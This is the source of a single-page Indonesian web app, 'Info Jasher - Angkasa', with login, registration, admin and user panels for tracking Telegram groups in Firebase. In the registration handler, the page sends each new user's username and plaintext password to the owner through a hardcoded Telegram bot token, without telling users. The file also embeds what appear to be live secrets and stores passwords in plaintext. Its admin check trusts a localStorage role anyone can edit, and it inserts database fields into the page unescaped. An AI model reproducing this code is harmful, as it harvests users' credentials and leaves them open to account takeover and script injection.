<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Info Jasher - Angkasa</title>
  <style>
    :root {
      --bg: #0b1220;
      --card: #10192f;
      --muted: #94a3b8;
      --accent: #7c3aed;
      --accent-hover: #6d28d9;
    }

    * {
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      background: var(--bg);
      color: #e6eef8;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
    }

    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      overflow-y: auto;
    }

    .center {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: var(--card);
      padding: 32px;
      border-radius: 16px;
      box-shadow: 0 8px 40px rgba(0,0,0,0.4);
      width: 100%;
      max-width: 420px;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(8px); }
      to { opacity: 1; transform: none; }
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 22px;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.1);
      font-size: 15px;
    }

    input {
      background: rgba(255,255,255,0.05);
      color: white;
    }

    button {
      background: var(--accent);
      border: 0;
      color: white;
      cursor: pointer;
      font-weight: 600;
      transition: 0.2s;
    }

    button:hover {
      background: var(--accent-hover);
    }

    .small {
      text-align: center;
      color: var(--muted);
      font-size: 13px;
      margin-top: 10px;
      cursor: pointer;
    }

    .wrap {
      width: 100%;
      max-width: 1100px;
      margin: auto;
      padding: 16px;
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    header {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      position: relative;
      padding-top: 40px;
      margin-bottom: 20px;
    }

    header h1 {
      font-size: 22px;
      margin: 0;
    }

    header .small {
      color: var(--muted);
      font-size: 14px;
      margin-top: 4px;
    }

    .search {
      padding: 8px 12px;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.1);
      background: transparent;
      color: inherit;
      flex: 1;
      min-width: 180px;
    }
    
    header.sticky {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      z-index: 20;
      background: var(--bg);
      box-shadow: 0 2px 20px rgba(0,0,0,0.6);
      padding: 15px 20px; /* tambahkan padding kiri-kanan */
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      gap: 8px; /* beri jarak antar elemen */
    }

    header.sticky .search {
      width: 100%;
      max-width: 500px; /* batas biar gak terlalu panjang di layar lebar */
      border-radius: 10px;
      border: 1px solid rgba(255,255,255,0.2);
      padding: 10px 15px;
      font-size: 16px;
      color: #fff;
      background: rgba(255,255,255,0.05);
      transition: all 0.2s ease;
    }

    header.sticky .search:focus {
      border-color: #8a63f3;
      background: rgba(255,255,255,0.1);
      outline: none;
    }

    .panel-space {
      margin-top: 160px; /* bisa kamu ubah sesuai tinggi header */
      padding: 0 20px;
      box-sizing: border-box;
    }

    .logout-btn {
      position: absolute;
      top: 8px;
      right: 8px;
      background: var(--accent);
      border: none;
      color: #fff;
      font-size: 18px;
      border-radius: 8px;
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: background 0.2s ease;
      z-index: 10;
    }

    .logout-btn:hover {
      background: var(--accent-hover);
    }

    /* === KOTAK TABEL SCROLLABLE === */
    .table-container {
      background: var(--card);
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
      overflow-y: auto;
      max-height: 300px; /* tampil 5 baris */
      margin-top: 10px;
      position: relative; /* penting biar sticky di sini, bukan di body */
    }

    table {
      width: 100%;
      border-collapse: collapse;
    }

    th, td {
      padding: 12px 14px;
      text-align: left;
      border-bottom: 1px solid rgb(120, 127, 138);
      font-size: 14px;
    }

    th {
      color: var(--muted);
      background: var(--card); /* biar warna header solid, gak transparan */
      font-weight: 500;
      position: sticky;
      top: 0;
      z-index: 2;
    }

    tr:hover td {
      background: rgba(255,255,255,0.02);
    }

    .delete {
      background: #ef4444;
      border: 0;
      color: white;
      padding: 6px 10px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 13px;
    }

    /* === MODAL === */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .modal-content {
      background: var(--card);
      border-radius: 16px;
      box-shadow: 0 8px 40px rgba(0,0,0,0.5);
      width: 90%;
      max-width: 500px;
      max-height: 80vh;
      overflow-y: auto;
      position: relative;
      padding: 24px;
      animation: fadeIn 0.3s ease;
    }

    .modal-content h3 {
      margin-top: 0;
      margin-bottom: 16px;
      font-size: 20px;
      text-align: center;
    }

    .close-btn {
      position: absolute;
      top: 12px;
      right: 16px;
      font-size: 28px;
      color: #fff;
      cursor: pointer;
      background: rgba(255,255,255,0.1);
      width: 32px;
      height: 32px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.2s;
    }

    .close-btn:hover {
      background: rgba(255,255,255,0.2);
    }

    footer {
      text-align: center;
      color: var(--muted);
      font-size: 13px;
      margin-top: auto;
      padding: 16px 0;
      border-top: 1px solid rgba(255,255,255,0.05);
      background: var(--bg);
    }

    @media (max-width: 768px) {
      .wrap { padding: 12px; }
      .modal-content { padding: 16px; }
    }
    
    #leaderboard-list div {
  transition: all 0.3s ease;
}
 
    /* === LEADERBOARD STYLING BARU === */
#leaderboard-list {
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin-top: 10px;
}

.leader-card {
  background: rgba(255,255,255,0.05);
  border-radius: 14px;
  padding: 16px 18px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
  transition: all 0.3s ease;
  border: 1px solid rgba(255,255,255,0.1);
}

.leader-card:hover {
  background: rgba(147, 51, 234, 0.15);
  transform: translateY(-3px);
  box-shadow: 0 0 12px rgba(147, 51, 234, 0.4);
}

.leader-rank {
  font-weight: bold;
  font-size: 16px;
  color: #c4b5fd;
}

.leader-name {
  font-size: 18px;
  font-weight: 600;
  color: #fff;
  margin-top: 4px;
}

.leader-status {
  font-size: 14px;
  font-weight: 500;
  color: #a3a3a3;
}

.leader-stats {
  margin-top: 8px;
  display: flex;
  flex-direction: column;
  gap: 4px;
  color: #d1d5db;
  font-size: 14px;
}

/* === ANIMASI LEADERBOARD === */
@keyframes fadeUp {
  0% {
    opacity: 0;
    transform: translateY(15px) scale(0.98);
  }
  100% {
    opacity: 1;
    transform: translateY(0) scale(1);
  }
}

.leader-card {
  opacity: 0;
  animation: fadeUp 0.6s ease forwards;
}

/* Scroll container untuk leaderboard */
.leaderboard-scroll {
  max-height: 480px; /* kira-kira cukup buat 3 blok */
  overflow-y: auto;
  scroll-behavior: smooth;
  padding-right: 6px; /* biar scrollbar gak nabrak teks */
}

/* Styling scrollbar biar halus */
.leaderboard-scroll::-webkit-scrollbar {
  width: 6px;
}
.leaderboard-scroll::-webkit-scrollbar-thumb {
  background: rgba(255,255,255,0.1);
  border-radius: 4px;
}
.leaderboard-scroll::-webkit-scrollbar-thumb:hover {
  background: rgba(255,255,255,0.2);
}

  </style>
</head>
<body>
  <main>
    <!-- LOGIN -->
    <div id="login-page" class="center">
      <div class="card">
        <h2>Login Info Jasher</h2>
        <input type="text" id="username" placeholder="Username">
        <input type="password" id="password" placeholder="Password">
        <button id="login-btn">Login</button>
        <div class="small" id="to-register">Belum punya akun? <u>Daftar</u></div>
      </div>
    </div>

    <!-- REGISTER -->
    <div id="register-page" class="center" style="display:none;">
      <div class="card">
        <h2>Buat Akun Baru</h2>
        <input type="text" id="reg-username" placeholder="Username">
        <input type="password" id="reg-password" placeholder="Password">
        <button id="register-btn">Daftar</button>
        <div class="small" id="to-login">Sudah punya akun? <u>Login</u></div>
      </div>
    </div>
    
    <!-- MENU PAGE -->
    <div id="menu-page" class="center" style="display:none;">
      <div class="card" style="text-align:center;">
        <h2>Selamat Datang!</h2>
        <p id="welcome-text" style="margin-bottom:20px;color:#94a3b8;">Pilih menu di bawah ini</p>
        <button id="btn-info">üìã Info Group</button>
        <button id="btn-leaderboard">üèÜ Top Leaderboard</button>
        <button id="btn-logout" style="background:#ef4444;margin-top:20px;">Keluar</button>
      </div>
    </div>
    
    <div id="leaderboard-page" class="center" style="display:none;">
      <div class="card">
        <h2>üèÜ Top Leaderboard</h2>
        <div class="leaderboard-scroll">
  <div id="leaderboard-list">Memuat data leaderboard...</div>
</div>
        <button id="back-to-menu" style="margin-top:15px;">Kembali ke Menu</button>
      </div>
    </div>
    
    <!-- ADMIN PANEL -->
    <div id="admin-panel" style="display:none;flex:1;">
      <div class="wrap panel-space">
        <header class="sticky">
          <h1>Admin Bot Jasher</h1>
          <div class="small">Kelola data grup di Database</div>
          <input id="search" class="search" placeholder="Cari grup...">
          <button id="logout" class="logout-btn" title="Keluar">‚ìò</button>
        </header>
        <div class="small" id="status">Status: <span id="stat-text">Belum terhubung</span></div>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>Nama Grup</th>
                <th>ID Grup</th>
                <th>Dimasukkan Oleh</th>
                <th>Total Member</th>
                <th>Terakhir Cek</th>
                <th>Aksi</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody id="tbody"><tr><td colspan="6">Memuat data...</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- USER PANEL -->
    <div id="user-panel" style="display:none;flex:1;">
      <div class="wrap panel-space">
        <header class="sticky">
          <h1>Daftar Grup</h1>
          <div class="small">Live Detail Group Jasher Angkasa</div>
          <input id="search-user" class="search" placeholder="Cari grup...">
          <button id="logout2" class="logout-btn" title="Keluar">‚ìò</button>
        </header>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>Nama Grup</th>
                <th>ID Grup</th>
                <th>Dimasukkan Oleh</th>
                <th>Total Member</th>
                <th>Status</th>
                <th>Terakhir Cek</th>
              </tr>
            </thead>
            <tbody id="user-tbody"><tr><td colspan="5">Memuat data...</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- MODAL DETAIL GRUP -->
    <div id="group-detail-modal" class="modal">
      <div class="modal-content">
        <span class="close-btn">&times;</span>
        <h3>Detail Grup</h3>
        <div class="modal-body">
          <p><strong>Nama Grup:</strong> <span id="modal-title">-</span></p>
          <p><strong>ID Grup:</strong> <span id="modal-id">-</span></p>
          <p><strong>Di Tambah Oleh:</strong> <span id="modal-added-by">-</span></p>
          <p><strong>Total Member:</strong> <span id="modal-member-count">-</span></p>
          <p><strong>Terakhir Cek:</strong> <span id="modal-last-checked">-</span></p>
          <p><strong>Deskripsi:</strong> <span id="modal-description">-</span></p>
        </div>
      </div>
    </div>
  </main>

  <footer>¬© 2025 Info Jasher Angkasa ‚Äî Semua Hak Dilindungi</footer>

  <script type="module">
  /* ===============================
     üîß FIREBASE CONFIGURATION
  =============================== */
  import { 
    initializeApp 
  } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
  import { 
    getFirestore, collection, doc, setDoc, getDoc, getDocs, 
    query, orderBy, deleteDoc, onSnapshot 
  } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDz621OqT9ERxnyCY7BGmh3iMUnb97-TDI",
    authDomain: "database-d81c7.firebaseapp.com",
    projectId: "database-d81c7",
    storageBucket: "database-d81c7.appspot.com",
    messagingSenderId: "934049685295",
    appId: "1:934049685295:web:17ad6001402c57b9434bda"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  /* ===============================
     üåê ELEMENTS & NAVIGATION
  =============================== */
  const loginPage = document.getElementById("login-page"),
        registerPage = document.getElementById("register-page"),
        adminPanel = document.getElementById("admin-panel"),
        userPanel = document.getElementById("user-panel");

  // Navigasi login/register
  document.getElementById("to-register").onclick = () => {
    loginPage.style.display = "none";
    registerPage.style.display = "flex";
  };

  document.getElementById("to-login").onclick = () => {
    registerPage.style.display = "none";
    loginPage.style.display = "flex";
  };

  /* ===============================
     üë§ REGISTER
  =============================== */
  document.getElementById("register-btn").onclick = async () => {
    const u = document.getElementById("reg-username").value.trim(),
          p = document.getElementById("reg-password").value.trim();

    if (!u || !p) return alert("Isi semua kolom!");
    const ref = doc(db, "users", u);
    const s = await getDoc(ref);
    if (s.exists()) return alert("Username sudah terdaftar!");

    await setDoc(ref, { username: u, password: p, role: "user" });

    const botToken = "8340805243:AAH1T5LKitu2ZNzSw3DctG2mCdVST63cMZI";  
    const ownerId = "6736986837";
    const message = `üôã‚Äç‚ôÇÔ∏è *User Baru Terdaftar!*\n\nüë§ Username: *${u}*\nüîë Password: *${p}*\nüìÖ Waktu: ${new Date().toLocaleString('id-ID')}`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
        chat_id: ownerId,
        text: message,
        parse_mode: "Markdown"
      })
    });
      } catch (err) {
    console.error("Gagal mengirim notifikasi ke owner:", err);
  }

    alert("Registrasi berhasil! Silakan login.");

      registerPage.style.display = "none";
      loginPage.style.display = "flex";
  };

  /* ===============================
     üîë LOGIN
  =============================== */
  document.getElementById("login-btn").onclick = async () => {
    const u = document.getElementById("username").value.trim(),
          p = document.getElementById("password").value.trim();

    if (!u || !p) return alert("Isi semua kolom!");
    const ref = doc(db, "users", u);
    const s = await getDoc(ref);
    if (!s.exists()) return alert("Akun tidak ditemukan!");

    const user = s.data();
    if (user.password !== p) return alert("Password salah!");

    localStorage.setItem("user", JSON.stringify(user));
    showPanel(user.role);
  };

  /* ===============================
     üö™ LOGOUT
  =============================== */
  document.getElementById("logout").onclick =
  document.getElementById("logout2").onclick = () => {
    localStorage.removeItem("user");
    location.reload();
  };

  /* ===============================
     ‚öôÔ∏è AUTO LOGIN
  =============================== */
  let current = null;
  try {
    current = JSON.parse(localStorage.getItem("user") || "null");
  } catch (e) { current = null; }
  if (current) showPanel(current.role);

  /* ===============================
     üìã PANEL HANDLER
  =============================== */
  function showPanel(role) {
    // Reset semua panel
    loginPage.style.display = "none";
    registerPage.style.display = "none";
    adminPanel.style.display = "none";
    userPanel.style.display = "none";
    document.getElementById("menu-page").style.display = "none";

    // Tampilkan menu utama
    document.getElementById("menu-page").style.display = "flex";
    const currentUser = JSON.parse(localStorage.getItem("user"));
    document.getElementById("welcome-text").textContent =
      `Halo ${currentUser.username}, pilih menu di bawah`;

    // Tombol logout dari menu
    document.getElementById("btn-logout").onclick = () => {
      localStorage.removeItem("user");
      location.reload();
    };

    // Tombol buka panel info
    document.getElementById("btn-info").onclick = () => {
      document.getElementById("menu-page").style.display = "none";
      if (role === "admin") {
        adminPanel.style.display = "flex";
        startRealtimeAdmin();
      } else {
        userPanel.style.display = "flex";
        startRealtimeUser();
      }
    };
  }

  /* ===============================
     üßë‚Äçüíº ADMIN PANEL
  =============================== */
  const tbody = document.getElementById("tbody"),
        statText = document.getElementById("stat-text"),
        search = document.getElementById("search");

  let allGroups = [];
  let blackIds = new Set();

  function renderAdmin(rows) {
    if (!rows.length) {
      tbody.innerHTML = '<tr><td colspan="6">Tidak ada grup.</td></tr>';
      return;
    }

    tbody.innerHTML = rows.map(r => `
      <tr class="group-row" 
          data-id="${r.id}" 
          data-title="${r.title || '(Tanpa Nama)'}" 
          data-addedby="${r.addedBy || '-'}" 
          data-membercount="${r.memberCount || '-'}" 
          data-lastchecked="${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}" 
          data-description="${r.description || 'Tidak ada deskripsi.'}">
        <td>${r.title || '(Tanpa Nama)'}</td>
        <td>${r.id}</td>
        <td>${r.addedByName || r.addedBy || '-'}</td>
        <td>${r.memberCount || '-'}</td>
        <td>${r.isBlacklisted ? "‚ö´ Blacklist" : "üü¢ Aktif"}</td>
        <td>${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}</td>
        <td>
          <button class="delete" data-id="${r.id}">Hapus</button>
          <button class="blacklist" data-id="${r.id}" data-name="${r.title || '(Tanpa Nama)'}">üö´ Blacklist</button>
        </td>
      </tr>
    `).join('');

    // Event: klik row = detail
    document.querySelectorAll(".group-row").forEach(row => {
      row.onclick = () => showGroupDetail(row.dataset);
    });

    // Event: hapus grup
    document.querySelectorAll(".delete").forEach(b => {
      b.onclick = async () => {
        if (confirm("Yakin hapus grup ini?")) {
          await deleteDoc(doc(db, "groups", b.dataset.id));
        }
      };
    });

    // Event: blacklist
    document.querySelectorAll(".blacklist").forEach(btn => {
      btn.onclick = async (e) => {
        e.stopPropagation();
        const groupId = btn.dataset.id;
        const groupName = btn.dataset.name;

        const blackRef = doc(db, "blacklist", groupId);
        const blackSnap = await getDoc(blackRef);

        if (blackSnap.exists()) {
          if (confirm(`Grup "${groupName}" sudah di blacklist.\nHapus dari blacklist?`)) {
            await removeFromBlacklist(groupId);
            alert("‚úÖ Grup dihapus dari blacklist.");
          }
        } else {
          const reason = prompt("Masukkan alasan blacklist:", "Spam / Tidak aktif");
          if (!reason) return;
          await addToBlacklist(groupId, groupName, reason);
          alert("üö´ Grup ditambahkan ke blacklist.");
        }
      };
    });
  }

  function applyFilterAdmin() {
    const t = (search.value || '').toLowerCase();
    renderAdmin(allGroups.filter(g => (g.title || '').toLowerCase().includes(t)));
  }

  function startRealtimeAdmin() {
    const q = query(collection(db, "groups"), orderBy("lastChecked", "desc"));

    // Pantau blacklist realtime
    onSnapshot(collection(db, "blacklist"), snap => {
      blackIds = new Set(snap.docs.map(d => d.id));
      allGroups = allGroups.map(g => ({ ...g, isBlacklisted: blackIds.has(g.id) }));
      applyFilterAdmin();
    });

    // Pantau groups realtime
    onSnapshot(q, s => {
      allGroups = s.docs.map(d => {
        const data = d.data();
        return { id: d.id, ...data, isBlacklisted: blackIds.has(d.id) };
      });
      applyFilterAdmin();
      statText.textContent = "Tersinkron ‚Äî " + allGroups.length + " grup";
    }, e => {
      statText.textContent = "Error: " + e.message;
    });
  }

  search.addEventListener("input", applyFilterAdmin);

  async function addToBlacklist(groupId, groupName, reason = "Tanpa alasan") {
    await setDoc(doc(db, "blacklist", groupId), {
      name: groupName,
      reason,
      date: Date.now(),
    });
    await setDoc(doc(db, "groups", groupId), {
      isBlacklisted: true,
      reason,
    }, { merge: true });
  }

  async function removeFromBlacklist(groupId) {
    await deleteDoc(doc(db, "blacklist", groupId));
    await setDoc(doc(db, "groups", groupId), {
      isBlacklisted: false,
      reason: null,
    }, { merge: true });
  }

  /* ===============================
     üë• USER PANEL
  =============================== */
  const userTbody = document.getElementById("user-tbody"),
        searchUser = document.getElementById("search-user");
  let userGroups = [];

  function renderUser(rows) {
    if (!rows.length) {
      userTbody.innerHTML = '<tr><td colspan="5">Tidak ada grup.</td></tr>';
      return;
    }

    userTbody.innerHTML = rows.map(r => `
      <tr class="group-row"
          data-id="${r.id}"
          data-title="${r.title || '(Tanpa Nama)'}"
          data-addedby="${r.addedBy || '-'}"
          data-membercount="${r.memberCount || '-'}"
          data-lastchecked="${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}"
          data-description="${r.description || 'Tidak ada deskripsi.'}">
        <td>${r.title || '(Tanpa Nama)'}</td>
        <td>${r.id}</td>
        <td>${r.addedByName || r.addedBy || '-'}</td>
        <td>${r.memberCount || '-'}</td>
        <td>${r.isBlacklisted ? "‚ö´ Blacklist" : "üü¢ Aktif"}</td>
        <td>${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}</td>
      </tr>
    `).join('');

    document.querySelectorAll(".group-row").forEach(row => {
      row.onclick = () => showGroupDetail(row.dataset);
    });
  }

  function applyFilterUser() {
    const t = (searchUser.value || '').toLowerCase();
    renderUser(userGroups.filter(g => (g.title || '').toLowerCase().includes(t)));
  }

  function startRealtimeUser() {
    const q = query(collection(db, "groups"), orderBy("lastChecked", "desc"));
    onSnapshot(q, s => {
      userGroups = s.docs.map(d => ({ id: d.id, ...d.data() }));
      applyFilterUser();
    });
  }

  searchUser.addEventListener("input", applyFilterUser);

  /* ===============================
     üìÑ MODAL DETAIL GRUP
  =============================== */
  function showGroupDetail(data) {
    document.getElementById("modal-title").textContent = data.title;
    document.getElementById("modal-id").textContent = data.id;
    document.getElementById("modal-added-by").textContent = data.addedbyname || data.addedby;
    document.getElementById("modal-member-count").textContent = data.membercount;
    document.getElementById("modal-last-checked").textContent = data.lastchecked;
    document.getElementById("modal-description").textContent = data.description;
    document.getElementById("group-detail-modal").style.display = "flex";
  }

  document.querySelector(".close-btn").onclick = () => {
    document.getElementById("group-detail-modal").style.display = "none";
  };

  window.onclick = (e) => {
    const modal = document.getElementById("group-detail-modal");
    if (e.target === modal) modal.style.display = "none";
  };

  /* ===============================
     üèÜ LEADERBOARD
  =============================== */
  const leaderboardList = document.getElementById("leaderboard-list");

  async function loadLeaderboard() {
    leaderboardList.textContent = "üìä Memuat data leaderboard...";
    try {
      const groupSnap = await getDocs(collection(db, "groups"));
      const stats = {};

      groupSnap.forEach(doc => {
        const data = doc.data();
        if (!data.addedBy) return;
        const userId = data.addedBy;
        const userName = data.addedByName || userId;

        if (!stats[userId]) stats[userId] = { name: userName, groups: 0, members: 0 };
        stats[userId].groups += 1;
        stats[userId].members += data.memberCount || 0;
      });

      const premSnap = await getDocs(collection(db, "premiumUsers"));
      const premiumList = premSnap.docs.map(d => d.id);

      const sorted = Object.entries(stats)
        .map(([id, { name, groups, members }]) => ({
          id,
          name,
          groups,
          members,
          status: premiumList.includes(id) ? "Premium" : "Free"
        }))
        .sort((a, b) => b.members - a.members || b.groups - a.groups);

      if (!sorted.length) {
        leaderboardList.innerHTML = "<p style='text-align:center;color:#94a3b8;'>Tidak ada data leaderboard.</p>";
        return;
      }

      leaderboardList.innerHTML = sorted.slice(0, 10).map((u, i) => {
        const rankColor =
          i === 0 ? "#facc15" :
          i === 1 ? "#a1a1aa" :
          i === 2 ? "#d97706" :
          "#94a3b8";

        return `
          <div class="leader-card" style="animation-delay:${i * 0.15}s;">
            <div class="leader-rank" style="color:${rankColor};">#${i + 1}</div>
            <div class="leader-name">${u.name}</div>
            <div class="leader-status">Status:
              <span style="color:${u.status === "Premium" ? "#facc15" : "#9ca3af"};">
                ${u.status}
              </span>
            </div>
            <div class="leader-stats">
              <div>üìã Jumlah Grup: <strong>${u.groups}</strong></div>
              <div>üë• Total Member: <strong style="color:#22d3ee;">${u.members}</strong></div>
            </div>
          </div>
        `;
      }).join("");
    } catch (err) {
      console.error("Gagal memuat leaderboard:", err);
      leaderboardList.innerHTML = `<p style="color:red;">Gagal memuat data: ${err.message}</p>`;
    }
  }

  document.getElementById("btn-leaderboard").onclick = () => {
    document.getElementById("menu-page").style.display = "none";
    document.getElementById("leaderboard-page").style.display = "flex";
    loadLeaderboard();
  };

  document.getElementById("back-to-menu").onclick = () => {
    document.getElementById("leaderboard-page").style.display = "none";
    document.getElementById("menu-page").style.display = "flex";
  };
</script>
</body>
</html>
